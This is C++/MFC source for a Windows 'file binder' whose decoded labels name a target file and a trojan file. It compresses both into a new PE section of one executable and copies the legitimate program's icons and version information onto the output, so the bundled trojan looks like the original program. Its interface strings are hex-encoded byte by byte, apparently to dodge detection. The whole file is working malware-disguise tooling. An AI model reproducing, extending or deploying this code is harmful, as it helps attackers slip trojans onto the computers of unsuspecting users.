// FileInsertDlg.cpp : implementation file
//

#include "stdafx.h"
#include "FileInsert.h"
#include "FileInsertDlg.h"

#include "Lzw.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CFileInsertDlg dialog

CFileInsertDlg::CFileInsertDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CFileInsertDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CFileInsertDlg)
	m_FileAdd = _T("");
	m_FileSrc = _T("");
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CFileInsertDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CFileInsertDlg)
	DDX_Text(pDX, IDC_EDIT_ADD, m_FileAdd);
	DDX_Text(pDX, IDC_EDIT_SRC, m_FileSrc);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CFileInsertDlg, CDialog)
	//{{AFX_MSG_MAP(CFileInsertDlg)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON_SRC, OnButtonSrc)
	ON_BN_CLICKED(IDC_BUTTON_ADD, OnButtonAdd)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CFileInsertDlg message handlers

BOOL CFileInsertDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here

	//文件捆绑器
	char m_TempStr[256] = {0};
	m_TempStr[0] = 0xce;
	m_TempStr[1] = 0xc4;
	m_TempStr[2] = 0xbc;
	m_TempStr[3] = 0xfe;
	m_TempStr[4] = 0xc0;
	m_TempStr[5] = 0xa6;
	m_TempStr[6] = 0xb0;
	m_TempStr[7] = 0xf3;
	m_TempStr[8] = 0xc6;
	m_TempStr[9] = 0xf7;
	m_TempStr[10] = 0x00;
	SetWindowText(m_TempStr);

	//目标文件：
	m_TempStr[0] = 0xc4;
	m_TempStr[1] = 0xbf;
	m_TempStr[2] = 0xb1;
	m_TempStr[3] = 0xea;
	m_TempStr[4] = 0xce;
	m_TempStr[5] = 0xc4;
	m_TempStr[6] = 0xbc;
	m_TempStr[7] = 0xfe;
	m_TempStr[8] = 0xa3;
	m_TempStr[9] = 0xba;
	m_TempStr[10] = 0x00;
	GetDlgItem(IDC_STATIC_SRC_FILE)->SetWindowText(m_TempStr);
	
	//木马文件：
	m_TempStr[0] = 0xc4;
	m_TempStr[1] = 0xbe;
	m_TempStr[2] = 0xc2;
	m_TempStr[3] = 0xed;
	m_TempStr[4] = 0xce;
	m_TempStr[5] = 0xc4;
	m_TempStr[6] = 0xbc;
	m_TempStr[7] = 0xfe;
	m_TempStr[8] = 0xa3;
	m_TempStr[9] = 0xba;
	m_TempStr[10] = 0x00;
	GetDlgItem(IDC_STATIC_ADD_FILE)->SetWindowText(m_TempStr);

	//捆绑
	m_TempStr[0] = 0xc0;
	m_TempStr[1] = 0xa6;
	m_TempStr[2] = 0xb0;
	m_TempStr[3] = 0xf3;
	m_TempStr[4] = 0x00;
	GetDlgItem(IDOK)->SetWindowText(m_TempStr);
	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CFileInsertDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CFileInsertDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

BOOL CFileInsertDlg::AddDataToPe(BYTE* pSaveData, DWORD DataLen, BYTE* pPeData, DWORD nPeLen, LPCTSTR pPeFile)
{
	// PE头偏移
	DWORD dwPE_Header_OffSet = *(DWORD *)(pPeData + 0x3C);
	
	// 取得 PE 头
	IMAGE_NT_HEADERS *pPE_Header = (IMAGE_NT_HEADERS *)(pPeData + dwPE_Header_OffSet);
	
	// 判断是否有效的PE文件
	if (pPE_Header->Signature != IMAGE_NT_SIGNATURE)
	{
		return FALSE;
	}

	// 计算新节的偏移地址
	DWORD dwMySectionOffSet = dwPE_Header_OffSet;
	dwMySectionOffSet += 4;		//sizeof("PE\0\0")
	dwMySectionOffSet += sizeof(IMAGE_FILE_HEADER);
	dwMySectionOffSet += sizeof(IMAGE_OPTIONAL_HEADER32);
	dwMySectionOffSet += pPE_Header->FileHeader.NumberOfSections * 0x28;	//NumberOfSections * sizeof(IMAGE_SECTION_HEADER)

	// 检查PE头的空间够不够大
	if(dwMySectionOffSet + 0x28 > pPE_Header->OptionalHeader.SizeOfHeaders)
	{
		// 如果 PE 头的空间不足会失败！
		return FALSE;
	}

	// 新节
	IMAGE_SECTION_HEADER *pNewSec = (IMAGE_SECTION_HEADER *)(pPeData + dwMySectionOffSet);

	// 读取新节位置处的内容，本该是全0
	for (int i = 0; i != 0x28; ++i)
	{
		BYTE bt = *((PBYTE)pNewSec + i);
		if (bt)
		{
			// 非0，说明这个空间已经被那什么延迟加载占用了
			// 只有抹掉image_directory_entry_bound_im，腾出空间。
			memset(pPeData + dwPE_Header_OffSet + 0xD0, 0, 8);
			break;
		}
	}
	
	pNewSec->Misc.VirtualSize = DataLen;
	
	// 新节的RVA
	pNewSec->VirtualAddress = pPE_Header->OptionalHeader.SizeOfImage;

	//SizeOfRawData在EXE文件中是对齐到FileAlignMent的整数倍的值
	pNewSec->SizeOfRawData = DataLen;
	pNewSec->SizeOfRawData /= pPE_Header->OptionalHeader.FileAlignment;
	pNewSec->SizeOfRawData++;
	pNewSec->SizeOfRawData *= pPE_Header->OptionalHeader.FileAlignment;
	
	// 设置新节的 PointerToRawData
	pNewSec->PointerToRawData = nPeLen;
	
	// 设置新节的属性
	pNewSec->Characteristics = 0x40000040;		//可读,，已初始化

	// 增加NumberOfSections
	pPE_Header->FileHeader.NumberOfSections++;

	// 增加SizeOfImage
	pPE_Header->OptionalHeader.SizeOfImage += 
		(pNewSec->Misc.VirtualSize/pPE_Header->OptionalHeader.SectionAlignment + 1) * 
		pPE_Header->OptionalHeader.SectionAlignment;


	// 保存到文件
	HANDLE hFile = CreateFile(
		pPeFile,
		GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL );
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	
	DWORD dw = 0;
	if (!WriteFile(hFile, pPeData, nPeLen, &dw, NULL)) {
		CloseHandle(hFile);
		return FALSE;
	}
	
	if(!WriteFile(hFile, pSaveData, DataLen, &dw, NULL)) {
		CloseHandle(hFile);
		return FALSE;
	}

	// 查了N久的bug点：
	int extraLen = pNewSec->SizeOfRawData - DataLen;
	if (extraLen != 0) {
		BYTE * pExtra = new BYTE[extraLen];
		memset(pExtra, 0, extraLen);
		if(!WriteFile(hFile, pExtra, extraLen, &dw, NULL)) {
			delete [] pExtra;
			CloseHandle(hFile);
			return FALSE;
		}
		delete [] pExtra;
	}
	CloseHandle(hFile);
	return TRUE;
}

BOOL GetFileSaveInfo(BYTE** pSrcFileData, DWORD* nSrcFileLen, BYTE** pAddFileData, DWORD* nAddFileLen)
{
	//文件数据
	DWORD nReadLen = 0;
	char m_DllName[MAX_PATH] = {0};
	GetModuleFileName(NULL, m_DllName, 200);
	HANDLE hFile = CreateFile(m_DllName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	DWORD nFileLen = GetFileSize(hFile, NULL);
	BYTE* pFileData = new BYTE[nFileLen];
	ReadFile(hFile, pFileData, nFileLen, &nReadLen, NULL);
	CloseHandle(hFile);

	//查找存储文件标志
	BYTE* pSaveInfo = NULL;
	for(DWORD i = nFileLen - sizeof(ULONGLONG); i > sizeof(ULONGLONG); i--)
	{
		if(*(ULONGLONG*) &pFileData[i] == PS_VER_ULONGLONG)
		{
			pSaveInfo = &pFileData[i];
			break;
		}
	}
	if(pSaveInfo == NULL)
	{
		delete [] pFileData;
		return FALSE;
	}

	FCLzw lzw;
	SYSFILEINFO m_FileInfo = {0};
	memcpy(&m_FileInfo, pSaveInfo, sizeof(SYSFILEINFO));
	pSaveInfo += sizeof(SYSFILEINFO);

	//原始文件
	*nSrcFileLen = *((DWORD*) &pSaveInfo[12]);
	*pSrcFileData = new BYTE[*nSrcFileLen * 2];
	memset(*pSrcFileData, 0, *nSrcFileLen * 2);
	lzw.PcUnZip(pSaveInfo, *pSrcFileData);

	pSaveInfo += m_FileInfo.nSrcFileLen;

	//附加文件
	*nAddFileLen = *((DWORD*) &pSaveInfo[12]);
	*pAddFileData = new BYTE[*nAddFileLen * 2];
	memset(*pAddFileData, 0, *nAddFileLen * 2);
	lzw.PcUnZip(pSaveInfo, *pAddFileData);

	delete [] pFileData;
	return TRUE;
}

void CFileInsertDlg::OnButtonSrc() 
{
	//*.exe
	char m_TempStr[256] = {0};
	m_TempStr[0] = '*';
	m_TempStr[1] = '.';
	m_TempStr[2] = 'e';
	m_TempStr[3] = 'x';
	m_TempStr[4] = 'e';
	m_TempStr[5] = 0x00;

	OPENFILENAME OpenFileName = {0};
	TCHAR szFile[MAX_PATH] = {0};
	TCHAR szFileName[MAX_PATH] = {0};
  	TCHAR szFilter[1024] = {0};
	lstrcpy(szFilter, m_TempStr);
	lstrcpy(szFilter + lstrlen(szFilter) + 1, m_TempStr);
	OpenFileName.lStructSize       = sizeof(OPENFILENAME);
    OpenFileName.hwndOwner         = GetSafeHwnd();
	OpenFileName.lpstrFilter       = szFilter;
    OpenFileName.lpstrCustomFilter = NULL;
    OpenFileName.nMaxCustFilter    = 0;
    OpenFileName.nFilterIndex      = 0;
    OpenFileName.lpstrFile         = szFile;
    OpenFileName.nMaxFile          = sizeof(szFile);
    OpenFileName.lpstrFileTitle    = szFileName;
    OpenFileName.nMaxFileTitle     = sizeof(szFileName);
    OpenFileName.lpstrInitialDir   = NULL;
    OpenFileName.lpstrTitle        = _T("");
    OpenFileName.nFileOffset       = 0;
    OpenFileName.nFileExtension    = 0;
    OpenFileName.lpstrDefExt       = NULL;
    OpenFileName.Flags             = OFN_EXPLORER | OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT;
	if(!GetOpenFileName(&OpenFileName))
	{
		return;
	}
	m_FileSrc = szFile;
	UpdateData(FALSE);
}

void CFileInsertDlg::OnButtonAdd() 
{
	//*.exe
	char m_TempStr[256] = {0};
	m_TempStr[0] = '*';
	m_TempStr[1] = '.';
	m_TempStr[2] = 'e';
	m_TempStr[3] = 'x';
	m_TempStr[4] = 'e';
	m_TempStr[5] = 0x00;

	OPENFILENAME OpenFileName = {0};
	TCHAR szFile[MAX_PATH] = {0};
	TCHAR szFileName[MAX_PATH] = {0};
  	TCHAR szFilter[1024] = {0};
	lstrcpy(szFilter, m_TempStr);
	lstrcpy(szFilter + lstrlen(szFilter) + 1, m_TempStr);
	OpenFileName.lStructSize       = sizeof(OPENFILENAME);
    OpenFileName.hwndOwner         = GetSafeHwnd();
	OpenFileName.lpstrFilter       = szFilter;
    OpenFileName.lpstrCustomFilter = NULL;
    OpenFileName.nMaxCustFilter    = 0;
    OpenFileName.nFilterIndex      = 0;
    OpenFileName.lpstrFile         = szFile;
    OpenFileName.nMaxFile          = sizeof(szFile);
    OpenFileName.lpstrFileTitle    = szFileName;
    OpenFileName.nMaxFileTitle     = sizeof(szFileName);
    OpenFileName.lpstrInitialDir   = NULL;
    OpenFileName.lpstrTitle        = _T("");
    OpenFileName.nFileOffset       = 0;
    OpenFileName.nFileExtension    = 0;
    OpenFileName.lpstrDefExt       = NULL;
    OpenFileName.Flags             = OFN_EXPLORER | OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT;
	if(!GetOpenFileName(&OpenFileName))
	{
		return;
	}
	m_FileAdd = szFile;
	UpdateData(FALSE);
}

BYTE* CFileInsertDlg::GetMySource(LPCTSTR pFileName, UINT* pFileLen)
{
	CFile m_File;
	if(!m_File.Open(pFileName, CFile::modeRead))
	{
		return NULL;
	}
	DWORD nFileLen = m_File.GetLength();
	BYTE* pSrcData = new BYTE[nFileLen * 2];
	memset(pSrcData, 0, nFileLen * 2);
	m_File.Read(pSrcData, nFileLen);
	m_File.Close();

	BYTE* pDesData = new BYTE[nFileLen * 2];
	memset(pDesData, 0, nFileLen * 2);

	FCLzw lzw;
	lzw.PcZip(pSrcData, pDesData, &nFileLen);
	*pFileLen = nFileLen;
	delete [] pSrcData;
	return pDesData;
}

void CFileInsertDlg::OnOK() 
{
	if(m_FileAdd.IsEmpty() || m_FileSrc.IsEmpty())
	{
		return;
	}

	//*.exe
	char m_TempStr[256] = {0};
	m_TempStr[0] = '*';
	m_TempStr[1] = '.';
	m_TempStr[2] = 'e';
	m_TempStr[3] = 'x';
	m_TempStr[4] = 'e';
	m_TempStr[5] = 0x00;

	OPENFILENAME OpenFileName = {0};
	TCHAR szFile[MAX_PATH] = {0};
	TCHAR szFileName[MAX_PATH] = {0};
  	TCHAR szFilter[1024] = {0};
	lstrcpy(szFilter, m_TempStr);
	lstrcpy(szFilter + lstrlen(szFilter) + 1, m_TempStr);
	OpenFileName.lStructSize       = sizeof(OPENFILENAME);
    OpenFileName.hwndOwner         = GetSafeHwnd();
	OpenFileName.lpstrFilter       = szFilter;
    OpenFileName.lpstrCustomFilter = NULL;
    OpenFileName.nMaxCustFilter    = 0;
    OpenFileName.nFilterIndex      = 0;
    OpenFileName.lpstrFile         = szFile;
    OpenFileName.nMaxFile          = sizeof(szFile);
    OpenFileName.lpstrFileTitle    = szFileName;
    OpenFileName.nMaxFileTitle     = sizeof(szFileName);
    OpenFileName.lpstrInitialDir   = NULL;
    OpenFileName.lpstrTitle        = _T("");
    OpenFileName.nFileOffset       = 0;
    OpenFileName.nFileExtension    = 0;
    OpenFileName.lpstrDefExt       = _T("*");
    OpenFileName.Flags             = OFN_EXPLORER | OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT;
	if(!GetSaveFileName(&OpenFileName))
	{
		return;
	}
	
	SYSFILEINFO m_FileInfo = {0};
	m_FileInfo.nVerifyFlag = PS_VER_ULONGLONG;

	//目标文件数据
	UINT nSrcFileLen = 0;
	BYTE* pSrcData = GetMySource(m_FileSrc, &m_FileInfo.nSrcFileLen);
	if(pSrcData == NULL)
	{
		return;
	}

	//木马文件数据
	UINT nAddFileLen = 0;
	BYTE* pAddData = GetMySource(m_FileAdd, &m_FileInfo.nAddFileLen);
	if(pSrcData == NULL)
	{
		delete [] pSrcData;
		return;
	}
	
	BYTE* pSaveData = new BYTE[sizeof(SYSFILEINFO) + m_FileInfo.nSrcFileLen + m_FileInfo.nAddFileLen];
	memcpy(pSaveData, &m_FileInfo, sizeof(SYSFILEINFO));
	BYTE* pData = pSaveData + sizeof(SYSFILEINFO);

	//目标文件数据
	memcpy(pData, pSrcData, m_FileInfo.nSrcFileLen);
	pData += m_FileInfo.nSrcFileLen;

	//木马文件数据
	memcpy(pData, pAddData, m_FileInfo.nAddFileLen);

	//EXE数据
	DWORD nReadLen = 0;
	char m_DllName[MAX_PATH] = {0};
	GetModuleFileName(NULL, m_DllName, 200);
	HANDLE hFile = CreateFile(m_DllName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		delete [] pSaveData;
		delete [] pSrcData;
		delete [] pAddData;
		return;
	}
	DWORD nExeFileLen = GetFileSize(hFile, NULL);
	BYTE* pFileData = new BYTE[nExeFileLen];
	ReadFile(hFile, pFileData, nExeFileLen, &nReadLen, NULL);
	CloseHandle(hFile);

	//This
	m_TempStr[0] = 'T';
	m_TempStr[1] = 'h';
	m_TempStr[2] = 'i';
	m_TempStr[3] = 's';
	m_TempStr[4] = 0x00;

	//修改EXE数据标志
	BOOL bIsSuccess = FALSE;
	for(DWORD i = 0; i < nExeFileLen; i++)
	{
		if(memcmp(&pFileData[i], m_TempStr, 4) == 0)
		{
			bIsSuccess = TRUE;
			pFileData[i + 4] = _EXEC_FILE_;
			break;
		}
	}
	if(!bIsSuccess)
	{
		delete [] pSaveData;
		delete [] pSrcData;
		delete [] pAddData;
		return;
	}

	if(!AddDataToPe(pSaveData, sizeof(SYSFILEINFO) + m_FileInfo.nSrcFileLen + m_FileInfo.nAddFileLen,
		pFileData, nExeFileLen, szFile))
	{

	}
	delete [] pFileData;
	delete [] pSrcData;
	delete [] pAddData;
	delete [] pSaveData;

	UpdateIcon(m_FileSrc, szFile);
}

BOOL CALLBACK EnumResNameProc(
  HMODULE hModule,   // module handle
  LPCTSTR lpszType,  // resource type
  LPTSTR lpszName,   // resource name
  LONG_PTR lParam    // application-defined parameter
)
{
	LPEXEDLLICONINFO pInfo = (LPEXEDLLICONINFO) lParam;

	HRSRC        	hRsrc = NULL;
    HGLOBAL        	hGlobal = NULL;
    LPMEMICONDIR    lpIcon = NULL;

    if((hRsrc = FindResource(pInfo->hInstance, lpszName, RT_GROUP_ICON )) == NULL )
    {
         return TRUE;
    }

    if((hGlobal = LoadResource( pInfo->hInstance, hRsrc)) == NULL )
    {
         return TRUE;
    }

    if((lpIcon = (LPMEMICONDIR) LockResource(hGlobal)) == NULL )
    {
         return TRUE;
    }

	UpdateFileResource(pInfo->szFileName, RT_GROUP_ICON, lpszName, lpIcon, SizeofResource(pInfo->hInstance, hRsrc));

	for(int i = 0; i < lpIcon->idCount; i++)
	{
		if((hRsrc = FindResource(pInfo->hInstance, MAKEINTRESOURCE(lpIcon->idEntries[i].nID), RT_ICON)) == NULL )
		{
			return TRUE;
		}

		if( (hGlobal = LoadResource( pInfo->hInstance, hRsrc )) == NULL )
		{
			return TRUE;
		}
		UpdateFileResource(pInfo->szFileName, RT_ICON, 
			MAKEINTRESOURCE(lpIcon->idEntries[i].nID), LockResource(hGlobal), SizeofResource(pInfo->hInstance, hRsrc));
	}
	return TRUE;
}

void CFileInsertDlg::UpdateIcon(LPCTSTR pSrcFileName, LPCTSTR pDesFileName)
{
 	EXEDLLICONINFO m_Info = {0};
	lstrcpy(m_Info.szFileName, pDesFileName);
	if((m_Info.hInstance = LoadLibraryEx(pSrcFileName, NULL, LOAD_LIBRARY_AS_DATAFILE )) == NULL )
	{
		return;
	}

	CWaitCursor m_Cur;

	//更新版本信息
	HRSRC        	hRsrc = NULL;
    HGLOBAL        	hGlobal = NULL;
    if((hRsrc = FindResource(m_Info.hInstance, MAKEINTRESOURCE(1), RT_VERSION)) != NULL )
    {
		if((hGlobal = LoadResource(m_Info.hInstance, hRsrc)) != NULL )
		{
			UpdateFileResource(pDesFileName, RT_VERSION, MAKEINTRESOURCE(1), 
			LockResource(hGlobal), SizeofResource(m_Info.hInstance, hRsrc));
		}
    }
 
	//更新图标信息
	EnumResourceNames(m_Info.hInstance, RT_GROUP_ICON, EnumResNameProc, (LPARAM) &m_Info);
	m_Cur.Restore();
}

BOOL UpdateFileResource(LPCTSTR pFileName, LPCSTR lpType, LPCSTR lpName, LPVOID pData, DWORD nLen)
{
	//开始替换资源
	HANDLE hFile = BeginUpdateResource(pFileName, FALSE);
	if(hFile == NULL)
	{
		return FALSE;
	}

	//宿主文件
	if(!UpdateResource(hFile, lpType, lpName, MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), pData,nLen))
	{
		return FALSE;
	}

	//更新资源
	return EndUpdateResource(hFile, FALSE);
}